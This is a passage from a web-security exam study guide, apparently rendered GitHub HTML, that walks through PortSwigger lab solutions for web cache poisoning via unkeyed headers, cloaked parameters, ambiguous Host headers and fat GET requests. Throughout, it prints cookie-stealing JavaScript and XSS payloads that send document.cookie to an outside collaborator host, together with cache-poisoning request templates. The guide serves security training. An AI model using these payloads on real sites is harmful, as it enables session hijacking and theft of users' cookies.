header\" href=\"#unkeyed-header\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTarget use \u003cstrong\u003etracking.js\u003c/strong\u003e JavaScript,\u003cbr\u003e\nand is vulnerable to \u003cstrong\u003e\u003ccode\u003eX-Forwarded-Host\u003c/code\u003e\u003c/strong\u003e or \u003cstrong\u003e\u003ccode\u003eX-Host\u003c/code\u003e\u003c/strong\u003e header redirecting path,\u003cbr\u003e\nallowing the stealing of cookie by poisoning cache.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the web cache headers in response and the tracking.js script in the page source code.\u003cbr\u003e\nExploit the vulnerability by hosting JavaScript and injecting the header to poison the cache of the target to redirect a victim visiting.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/tracking-code-review.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/tracking-code-review.png\" alt=\"Tracking source code review\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"X-Forwarded-Host: EXPLOIT.net\nX-Host: EXPLOIT.net\"\u003e\u003cpre\u003eX-Forwarded-Host: EXPLOIT.net\nX-Host: EXPLOIT.net\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/tracking.js.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/tracking.js.png\" alt=\"tracking.js\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHosting on the exploit server, injecting the \u003cstrong\u003e\u003ccode\u003eX-Forwarded-Host\u003c/code\u003e\u003c/strong\u003e header in request, and poison the cache until victim hits poison cache.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"/resources/js/tracking.js\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e/resources/js/tracking.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/exploit-host-tracking-js.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/exploit-host-tracking-js.png\" alt=\"exploit host tracking.js\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBody send session cookie to collaboration service.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"document.location='https://OASTIFY.COM/?cookies='+document.cookie;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003elocation\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'https://OASTIFY.COM/?cookies='\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ecookie\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eKeep \u003cstrong\u003ePoisoning\u003c/strong\u003e the web cache of target by resending request with \u003ccode\u003eX-Forwarded-Host\u003c/code\u003e header.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/x-cache-hit.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/x-cache-hit.png\" alt=\"x-cache-hit.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header\" rel=\"nofollow\"\u003ePortSwigger Lab: Web cache poisoning with an unkeyed header\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eYoutube video showing above lab payload on exploit server modified to steal victim cookie when victim hits a cached entry on back-end server. The payload is the above JavaScript.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://youtu.be/eNmF8fq-ur8\" rel=\"nofollow\"\u003eYouTube: Web cache poisoning with unkeyed header - cookie stealer\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943\" rel=\"nofollow\"\u003eParam Miner Extension to identify web cache vulnerabilities\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eUnkeyed utm_content\u003c/h3\u003e\u003ca id=\"user-content-unkeyed-utm_content\" class=\"anchor\" aria-label=\"Permalink: Unkeyed utm_content\" href=\"#unkeyed-utm_content\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTarget is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. Param Miner's \"Guess GET parameters\" feature will \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the parameter as utm_content.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cache-query-reflected.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cache-query-reflected.png\" alt=\"Cache query reflected\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET /?utm_content='/\u0026gt;\u0026lt;script\u0026gt;document.location=\u0026quot;https://OASTIFY.COM?c=\u0026quot;+document.cookie\u0026lt;/script\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET /?utm_content='/\u0026gt;\u0026lt;script\u0026gt;document.location=\"https://OASTIFY.COM?c=\"+document.cookie\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAbove payload is cached and the victim visiting target cookie send to Burp collaborator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cache-collaborator.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/cache-collaborator.png\" alt=\"cache-collaborator.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param\" rel=\"nofollow\"\u003ePortSwigger Lab: Web cache poisoning via an unkeyed query parameter\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCloaking utm_content\u003c/h3\u003e\u003ca id=\"user-content-cloaking-utm_content\" class=\"anchor\" aria-label=\"Permalink: Cloaking utm_content\" href=\"#cloaking-utm_content\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eParam Miner extension doing a \u003ccode\u003eBulk scan \u0026gt; Rails parameter cloaking scan\u003c/code\u003e will \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the vulnerability automatically. Manually it can be identified by adding \u003ccode\u003e;\u003c/code\u003e to append another parameter to \u003ccode\u003eutm_content\u003c/code\u003e, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key.\u003cbr\u003e\nThe \u003ccode\u003esource code\u003c/code\u003e for \u003ccode\u003e/js/geolocate.js?callback=setCountryCookie\u003c/code\u003e is called on every page and execute callback function.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe \u003ccode\u003ecallback\u003c/code\u003e parameter is keyed, and thus cannot poison cache for victim user, but by combine duplicate parameter with \u003ccode\u003eutm_content\u003c/code\u003e it then excluded and cache can be poisoned.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET /js/geolocate.js?callback=setCountryCookie\u0026amp;utm_content=fuzzer;callback=EVILFunction\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET /js/geolocate.js?callback=setCountryCookie\u0026amp;utm_content=fuzzer;callback=EVILFunction\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/utm_content_cloaking.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/utm_content_cloaking.png\" alt=\"utm_content cache cloaking\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCache Cloaking Cookie Capturing payload below, keep poising cache until victim hits stored cache.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET /js/geolocate.js?callback=setCountryCookie\u0026amp;utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='%2bdocument.cookie%3b HTTP/2\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET /js/geolocate.js?callback=setCountryCookie\u0026amp;utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='%2bdocument.cookie%3b HTTP/2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow is \u003ca href=\"https://www.urldecoder.org/\" rel=\"nofollow\"\u003eUrl Decoded\u003c/a\u003e payload.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET/js/geolocate.js?callback=setCountryCookie\u0026amp;utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='+document.cookie; HTTP/2\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET/js/geolocate.js?callback=setCountryCookie\u0026amp;utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='+document.cookie; HTTP/2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking\" rel=\"nofollow\"\u003ePortSwigger Lab: Parameter cloaking\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003ePoison ambiguous request\u003c/h3\u003e\u003ca id=\"user-content-poison-ambiguous-request\" class=\"anchor\" aria-label=\"Permalink: Poison ambiguous request\" href=\"#poison-ambiguous-request\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAdding a second \u003cstrong\u003eHost\u003c/strong\u003e header with an exploit server, this \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e a ambiguous cache vulnerability and routing your request. Notice that the exploit server in second \u003cstrong\u003eHost\u003c/strong\u003e header is reflected in an absolute URL used to import a script from \u003ccode\u003e/resources/js/tracking.js\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"Host: TARGET.net\nHost: exploit.net\"\u003e\u003cpre\u003eHost: TARGET.net\nHost: exploit.net\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn the exploit server set a file as same path target calls to \u003ccode\u003e/resources/js/tracking.js\u003c/code\u003e, this will contain the payload. Place the JavaScript payload code below to perform a cookie stealer.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"document.location='https://OASTIFY.COM/?CacheCookies='+document.cookie;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003edocument.location='https://OASTIFY.COM/?CacheCookies='+document.cookie;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ambiguous-hosts.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ambiguous-hosts.png\" alt=\"Ambiguous Hosts\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests\" rel=\"nofollow\"\u003ePortSwigger Lab: Web cache poisoning via ambiguous requests\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCache Poison multiple headers\u003c/h3\u003e\u003ca id=\"user-content-cache-poison-multiple-headers\" class=\"anchor\" aria-label=\"Permalink: Cache Poison multiple headers\" href=\"#cache-poison-multiple-headers\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIdentify that cache hit headers in responses,\u003cbr\u003e\nthen test if the target support \u003ccode\u003eX-Forwarded-Host\u003c/code\u003e or \u003ccode\u003eX-Forwarded-Scheme\u003c/code\u003e headers.\u003cbr\u003e\nThese headers can allow for the stealing of victim session cookie.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIdentify if adding the two \u003cstrong\u003eForwarded\u003c/strong\u003e headers to the GET \u003ccode\u003e/resources/js/tracking.js\u003c/code\u003e request, result in a change to the location response header. This \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e positive poisoning of the cache with multiple headers.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"GET /resources/js/tracking.js?cb=123 HTTP/2\nHost: TARGET.net\nX-Forwarded-Host: EXPLOIT.net\nX-Forwarded-Scheme: nothttps\"\u003e\u003cpre\u003eGET /resources/js/tracking.js?cb=123 HTTP/2\nHost: TARGET.net\nX-Forwarded-Host: EXPLOIT.net\nX-Forwarded-Scheme: nothttps\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/x-forwarded-scheme-nohttps.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/x-forwarded-scheme-nohttps.png\" alt=\"x-forwarded-scheme not https\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn the exploit server change the file path to \u003ccode\u003e/resources/js/tracking.js\u003c/code\u003e\u003cbr\u003e\nand then update the poison request \u003ccode\u003eX-Forwarded-Host: EXPLOIT.net\u003c/code\u003e header.\u003cbr\u003e\nPlace the payload on exploit server body.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"document.location='https://OASTIFY.COM/?poisoncache='+document.cookie;\"\u003e\u003cpre\u003edocument.location='https://OASTIFY.COM/?poisoncache='+document.cookie;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eRemove the \u003ccode\u003ecb=123\u003c/code\u003e cache \u003cstrong\u003ebuster\u003c/strong\u003e, and then poison the cache until the victim is redirected to the exploit server payload tracking.js to steal session cookie.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers\" rel=\"nofollow\"\u003ePortSwigger Lab: Web cache poisoning with multiple headers\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDuplicate Parameter Fat Poison\u003c/h3\u003e\u003ca id=\"user-content-duplicate-parameter-fat-poison\" class=\"anchor\" aria-label=\"Permalink: Duplicate Parameter Fat Poison\" href=\"#duplicate-parameter-fat-poison\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIdentify that the application is vulnerable to duplicate parameter poisoning, by adding a second parameter with same name and different value the response reflected the injected value.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/countrycode-source-code.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/countrycode-source-code.png\" alt=\"countrycode source code\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET /js/geolocate.js?callback=setCountryCookie\u0026amp;callback=FUZZERFunction; HTTP/2\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET /js/geolocate.js?callback=setCountryCookie\u0026amp;callback=FUZZERFunction; HTTP/2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe function that is called in the response by passing in a duplicate callback parameter is reflected. Notice in response the cache key is still derived from the original callback parameter in the GET request line.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/fat-get-request.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/fat-get-request.png\" alt=\"fat-get-request\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNot able to make cookie stealer payload working......\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get\" rel=\"nofollow\"\u003ePortSwigger Lab: Web cache poisoning via a fat GET request\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eHost Headers\u003c/h2\u003e\u003ca id=\"user-content-host-headers\" class=\"anchor\" aria-label=\"Permalink: Host Headers\" href=\"#host-headers\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#spoof-ip-address\"\u003eSpoof IP Address\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#host-connection-state\"\u003eHOST Connection State\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#host-routing-based-ssrf\"\u003eHost Routing based SSRF\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#absolute-get-url--host-ssrf\"\u003eSSRF via flawed Host request parsing\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSpoof IP Address\u003c/h3\u003e\u003ca id=\"user-content-spoof-ip-address\" class=\"anchor\" aria-label=\"Permalink: Spoof IP Address\" 